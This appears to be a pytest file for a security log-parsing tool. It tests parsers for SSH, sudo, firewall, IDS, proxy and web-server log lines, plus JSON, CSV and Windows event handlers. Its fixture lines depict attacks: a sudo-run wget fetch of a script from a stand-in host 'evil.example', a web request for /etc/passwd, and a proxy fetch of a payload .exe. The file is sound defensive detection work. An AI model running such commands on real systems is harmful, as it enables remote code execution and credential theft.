import json

from parsers.firewall_parser import parse_kv_line, parse_squid_line, parse_suricata_line
from parsers.generic_parser import parse_generic_line
from parsers.registry import get_file_handler
from parsers.apache_parser import parse_line as parse_apache
from parsers.syslog_parser import parse_line as parse_syslog


# ---------- syslog ----------

def test_syslog_ssh_failed_password():
    f = parse_syslog("Aug 25 10:30:01 server sshd: Failed password for admin from 185.23.45.67")
    assert f is not None
    assert f["event_type"] == "auth_failure"
    assert f["username"] == "admin"
    assert f["src_ip"] == "185.23.45.67"
    assert f["ts_raw"] == "Aug 25 10:30:01"
    assert f["hostname"] == "server"


def test_syslog_ssh_accepted_publickey_with_pid():
    f = parse_syslog("Aug 25 10:31:00 web01 sshd[2041]: Accepted publickey for deploy from 10.0.0.5")
    assert f["event_type"] == "auth_success"
    assert f["username"] == "deploy"
    assert f["_pid"] == "2041"


def test_syslog_invalid_user():
    f = parse_syslog("Aug 25 03:11:09 srv sshd[99]: Invalid user oracle from 203.0.113.9")
    assert f["event_type"] == "auth_failure"
    assert f["username"] == "oracle"
    assert f["src_ip"] == "203.0.113.9"


def test_syslog_sudo_command():
    f = parse_syslog("Aug 25 10:32:20 srv sudo:   admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.example/x.sh")
    assert f["event_type"] == "privilege_escalation"
    assert f["username"] == "admin"
    assert "wget" in f["command_line"]


def test_syslog_ufw_block():
    f = parse_syslog("Aug 25 10:33:01 fw kernel: [12345.66] [UFW BLOCK] IN=eth0 OUT= SRC=185.23.45.67 DST=10.0.0.15 PROTO=TCP DPT=445")
    assert f["event_type"] == "firewall_event"
    assert f["status"] == "block"
    assert f["dst_port"] == 445


# ---------- apache / nginx ----------

def test_apache_combined_get():
    f = parse_apache('185.23.45.67 - - [25/Aug/2026:10:31:02 +0000] "GET /etc/passwd HTTP/1.1" 200 1043 "-" "curl/8.0"')
    assert f["event_type"] == "http_request"
    assert f["src_ip"] == "185.23.45.67"
    assert f["http_method"] == "GET"
    assert "/etc/passwd" in f["http_path"]
    assert f["status"] == "200"


def test_apache_post_auth_401():
    f = parse_apache('10.0.0.9 - admin [25/Aug/2026:10:31:04 +0000] "POST /wp-login.php HTTP/1.1" 401 210 "-" "Mozilla/5.0"')
    assert f["username"] == "admin"
    assert f["action"] == "client_error"
    assert f["user_agent"] == "Mozilla/5.0"


# ---------- firewall kv / ids / proxy ----------

def test_firewall_kv_deny():
    f = parse_kv_line("SRC=185.23.45.67 DST=10.0.0.15 PROTO=TCP DPT=443 ACTION=DENY")
    assert f["event_type"] == "firewall_event"
    assert f["src_ip"] == "185.23.45.67"
    assert f["dst_port"] == 443
    assert f["status"] == "deny"


def test_firewall_kv_lowercase_allow():
    f = parse_kv_line("src=192.168.1.7 dst=192.168.1.1 proto=UDP action=ALLOW")
    assert f["protocol"] == "UDP"
    assert f["status"] == "allow"


def test_firewall_rejects_non_kv():
    assert parse_kv_line("just some plain text without pairs") is None


def test_suricata_alert():
    f = parse_suricata_line('08/25/26-10:35:01.123456  [**] [1:2019876:3] ET SCAN Suspicious inbound to SSH [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 2] {TCP} 185.23.45.67:51234 -> 10.0.0.15:22')
    assert f["event_type"] == "ids_alert"
    assert f["src_ip"] == "185.23.45.67"
    assert f["dst_port"] == 22
    assert f["severity_hint"] == "MEDIUM"


def test_squid_proxy_denied():
    f = parse_squid_line("1728813601.123   45 10.0.0.9 TCP_DENIED/403 512 GET http://malware.example/payload.exe - DIRECT/HIER - text/plain")
    assert f["event_type"] == "proxy_request"
    assert f["action"] == "deny"
    assert f["url"].endswith(".exe")


# ---------- generic ----------

def test_generic_extracts_timestamp_and_ips():
    f = parse_generic_line("2026-08-25 10:30:12 connection from 10.10.2.15 to 8.8.8.8 dropped")
    assert f["ts_raw"].startswith("2026-08-25")
    assert f["src_ip"] == "10.10.2.15"
    assert f["dst_ip"] == "8.8.8.8"
    assert f["status"] == "failure"


# ---------- file-level handlers ----------

def test_jsonl_handler(tmp_path):
    p = tmp_path / "events.json"
    lines = [
        {"timestamp": "2026-08-25T10:30:12Z", "source_ip": "10.10.2.15", "action": "DENY"},
        {"timestamp": "2026-08-25T10:30:13Z", "source_ip": "10.10.2.16", "action": "ALLOW"},
    ]
    p.write_text("\n".join(json.dumps(x) for x in lines), encoding="utf-8")
    recs = list(get_file_handler("json")(p))
    assert len(recs) == 2
    _, raw, fields = recs[0]
    assert fields["source_ip"] == "10.10.2.15"


def test_csv_handler(tmp_path):
    p = tmp_path / "flows.csv"
    p.write_text(
        "timestamp,src_ip,dst_ip,action\n"
        "2026-08-25T10:30:12Z,10.10.2.15,8.8.8.8,DENY\n"
        "2026-08-25T10:30:13Z,10.10.2.16,1.1.1.1,ALLOW\n",
        encoding="utf-8",
    )
    recs = list(get_file_handler("csv")(p))
    assert len(recs) == 2
    assert recs[0][2]["src_ip"] == "10.10.2.15"


def test_windows_xml_handler(tmp_path):
    p = tmp_path / "evtx_export.xml"
    p.write_text(
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System><EventID>4625</EventID>"
        '<TimeCreated SystemTime="2026-08-25T10:40:01.000Z"/>'
        "<Computer>DC01</Computer></System>"
        "<EventData><Data Name=\"TargetUserName\">administrator</Data>"
        "<Data Name=\"IpAddress\">185.23.45.67</Data></EventData></Event>",
        encoding="utf-8",
    )
    recs = list(get_file_handler("windows")(p))
    assert len(recs) == 1
    fields = recs[0][2]
    assert fields["event_id"] == 4625
    assert fields["hostname"] == "DC01"
    assert fields["targetusername"] == "administrator"
    assert fields["ipaddress"] == "185.23.45.67"
